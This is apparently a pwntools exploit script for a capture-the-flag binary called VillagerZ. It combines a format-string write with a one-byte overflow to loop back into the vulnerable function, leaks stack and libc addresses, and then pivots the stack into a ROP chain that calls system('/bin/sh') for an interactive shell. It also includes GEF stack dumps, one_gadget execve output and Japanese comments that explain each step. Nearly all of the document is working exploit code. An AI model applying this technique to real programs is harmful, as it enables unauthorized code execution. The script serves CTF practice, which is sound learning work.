from pwn import *
elf_file = FILENAME = '/home/k1zuna/D/2020/nitic/VillagerZ'
elf = context.binary = ELF(elf_file)
#context.log_level = 'debug' # output verbose log




HOST = 'localhost'
POST = 7777
libc = ELF("./libc.so.6")
#libc_ver = "libc6_2.31-0ubuntu9_amd64" libc_database
"""
if len(sys.argv) > 1 and sys.argv[1] == 'r':
  c = remote(HOST, POST)
else:
  c = process(FILENAME)
  pid = gdb.attach(c,gdbscript='''b main''')

"""

def send_payload(payload):
    log.info(f"payload = {payload}")
    c.send(payload)
    return c.recv()

while True:
  c = process(['./VillagerZ'])
  try:
    vuln = 0xb3
    ret_ptr_fs = 6 + (0x00007fff9e1acf18- 0x00007fff9e1ace30) // 8
    libc_ptr_fs = 6 + (0x00007fff9e1acf58- 0x00007fff9e1ace30) // 8
    padding = 0x00007ffdebe7ee08- 0x00007ffdebe7ed20
    

    payload  = f"%{vuln}c%{ret_ptr_fs}$hhn"
    payload += f"|%{ret_ptr_fs}$p|%{libc_ptr_fs}$p|"
    payload += "A" * (padding - len(payload)) + '\x48'
    #0x00007fff9e1acf18│+0x00f0: 0x00007fff9e1acf40 ➡ 0x00007fff9e1acf48 overwrite

    log.info(f"payload = {payload}")
    c.sendafter('name?\n',payload)#1/16

    leaks = c.recvuntil('name?\n').split(b'|')# EOF error catch

    gdb.attach(c,gdbscript='''\
    b *vuln+82
    ''')


    stack_leak = int(leaks[1],16)
    libc_leak = int(leaks[2],16)
    log.info(f"stack_leak = {hex(stack_leak)}")
    libc.address = libc_leak - (libc.sym["__libc_start_main"] + 0xf3)
    log.info(f"libc_base = {hex(libc.address)}")
    target_address = stack_leak-0x20

    """
    writes = {
      target_address:libc.address+0x00163ccc,
      target_address+0x8:next(libc.search("/bin/sh\x00")),
      target_address+0x10:libc.sym["system"],
    }
    payload2 = fmtstr_payload(6,writes,write_size='short')
    """
    leave = 0x35
    #mov rsp, rbp
    #pop rbp
    ret_ptr_fs = 6 + (0x00007ffec7ad2c18 - 0x00007ffec7ad2b30) // 8
    rbp_ptr_fs = 6 + (0x00007ffec7ad2b88 - 0x00007ffec7ad2b30) // 8
    rbp = stack_leak - 0x8
    rop_ptr = ((stack_leak - 0x00007ffec7ad2c48 + 0x00007ffec7ad2b70) & 0xffff) - 0x8
    log.info(f"rop_ptr = {rop_ptr}")
    payload2  = "".encode()

    payload2 += f"%{leave}c%{ret_ptr_fs}$hhn".encode()
    payload2 += f"%{rop_ptr - leave}c%{rbp_ptr_fs}$hn".encode()
    payload2 += b'A' * (0x40 - len(payload2))
    payload2 += p64(libc.address+0x00163ccc)#40
    payload2 += p64(next(libc.search("/bin/sh\x00")))#48
    payload2 += p64(libc.sym["system"])#50
    payload2 += p64(rbp)#58

    log.info(f"payload2 = {payload2}")
    log.info(f"payload2 = {len(payload2)}")
    c.send(payload2)

    c.interactive()
    break
  except EOFError:
    pass
  c.close()
#0x7fffe1fd6b48


"""
0x00007fff9e1ace28│+0x0000: 0x000057e53ee1e20c  →  <vuln+0043> lea rax, [rbp-0x110]	 ← $rsp
0x00007fff9e1ace30│+0x0008: 0x0000098000000980	 ← $rsi
0x00007fff9e1ace38│+0x0010: 0x0000098000000980
0x00007fff9e1ace40│+0x0018: 0x0000098000000980
0x00007fff9e1ace48│+0x0020: 0x0000098000000980
0x00007fff9e1ace50│+0x0028: 0x0000098000000980
0x00007fff9e1ace58│+0x0030: 0x0000098000000980
0x00007fff9e1ace60│+0x0038: 0x0000098000000980
0x00007fff9e1ace68│+0x0040: 0x0000098000000980
0x00007fff9e1ace70│+0x0048: 0x0000098000000980
gef➤  
0x00007fff9e1ace78│+0x0050: 0x0000098000000980
0x00007fff9e1ace80│+0x0058: 0x0000098000000980
0x00007fff9e1ace88│+0x0060: 0x0000098000000980
0x00007fff9e1ace90│+0x0068: 0x0000000000000000
0x00007fff9e1ace98│+0x0070: 0x0000000000000100
0x00007fff9e1acea0│+0x0078: 0x0000004000000000
0x00007fff9e1acea8│+0x0080: 0x0000040000000200
0x00007fff9e1aceb0│+0x0088: 0x0000000000000000
0x00007fff9e1aceb8│+0x0090: 0x00007cacf49ec5c0  →  0x00000000fbad2087
0x00007fff9e1acec0│+0x0098: 0x0000000000000000
gef➤  
0x00007fff9e1acec8│+0x00a0: 0x00007cacf48956a5  →   cmp eax, 0xffffffff
0x00007fff9e1aced0│+0x00a8: 0x0000000000000000
0x00007fff9e1aced8│+0x00b0: 0x00007cacf49ec5c0  →  0x00000000fbad2087
0x00007fff9e1acee0│+0x00b8: 0x0000000000000000
0x00007fff9e1acee8│+0x00c0: 0x0000000000000000
0x00007fff9e1acef0│+0x00c8: 0x00007cacf49ed4a0  →  0x0000000000000000
0x00007fff9e1acef8│+0x00d0: 0x00007cacf48916bd  →  <_IO_file_setbuf+000d> test rax, rax
0x00007fff9e1acf00│+0x00d8: 0x00007cacf49ec5c0  →  0x00000000fbad2087
0x00007fff9e1acf08│+0x00e0: 0x00007cacf4887f65  →  <setvbuf+0105> xor r8d, r8d
0x00007fff9e1acf10│+0x00e8: 0x000057e53ee1e2c0  →  <__libc_csu_init+0000> endbr64 
gef➤  
0x00007fff9e1acf18│+0x00f0: 0x00007fff9e1acf40  →  0x00007fff9e1acf50  →  0x0000000000000000
0x00007fff9e1acf20│+0x00f8: 0x000057e53ee1e0e0  →  <_start+0000> endbr64 
0x00007fff9e1acf28│+0x0100: 0x00007fff9e1ad040  →  0x0000000000000001
0x00007fff9e1acf30│+0x0108: 0x0000000000000000
0x00007fff9e1acf38│+0x0110: 0x36cf03efa4b77d00
0x00007fff9e1acf40│+0x0118: 0x00007fff9e1acf50  →  0x0000000000000000	 ← $rbp
0x00007fff9e1acf48│+0x0120: 0x000057e53ee1e2b8  →  <main+001c> mov eax, 0x0
0x00007fff9e1acf50│+0x0128: 0x0000000000000000
0x00007fff9e1acf58│+0x0130: 0x00007cacf48270b3  →  <__libc_start_main+00f3> mov edi, eax
0x00007fff9e1acf60│+0x0138: 0x00007cacf4a21620  →  0x0006080c00000000
"""


"""
0xe6aee execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xe6af1 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xe6af4 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

"""

"""
fmtstr = FmtStr(execute_fmt=send_payload,offset=6,overflows)
fmtstr.write(target_address,libc.address+0x00163ccc)#prdi
fmtstr.write(target_address+0x8,next(libc.search("/bin/sh\x00")))
fmtstr.write(target_address+0x10,libc.sym["system"])
fmtstr.execute_writes()
"""



# 0x00007ffdebe7ed20などはGDBで入手

# ret_ptr_fsはBOFで1byte書き換えた後のアドレス
#(元々はstack内を指すアドレスをmain+1cのアドレスに変更)

# padding+ '\x38' はその書き換えを行うための物

# main+1cへのリターンアドレスを指すret_pts_fsに向けてFSA、1byte書き換えてvulnに書き換える


